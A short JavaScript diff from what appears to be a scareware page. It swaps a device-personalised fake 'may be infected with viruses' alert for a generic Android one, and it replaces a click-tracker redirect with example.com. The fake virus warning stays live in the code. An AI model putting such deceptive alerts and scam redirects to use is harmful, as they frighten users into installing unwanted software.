@@ -39,8 +39,9 @@ function countDown() {
 }
 window.onload = countDown;
 
-      alert("WARNING!\n\nYour " + (getURLParameter('brand')) + "-" + (getURLParameter('model')) + " may be infected with viruses!\n\n\You should immediately install anti-virus program to clean the system otherwise your " + (getURLParameter('os')) + "-" + (getURLParameter('osv')) + " may be blocked");
+      /*alert("WARNING!\n\nYour " + (getURLParameter('brand')) + "-" + (getURLParameter('model')) + " may be infected with viruses!\n\n\You should immediately install anti-virus program to clean the system otherwise your " + (getURLParameter('os')) + "-" + (getURLParameter('osv')) + " may be blocked");*/
+      alert("WARNING!\n\nYour mobile device may be infected with viruses!\n\n\You should immediately install anti-virus program to clean the system otherwise your Android may be blocked");
 
       function goto() {
-        location.href = "http://s44a8.voluumtrk.com/click"
+        location.href = "http://www.example.com"
       }
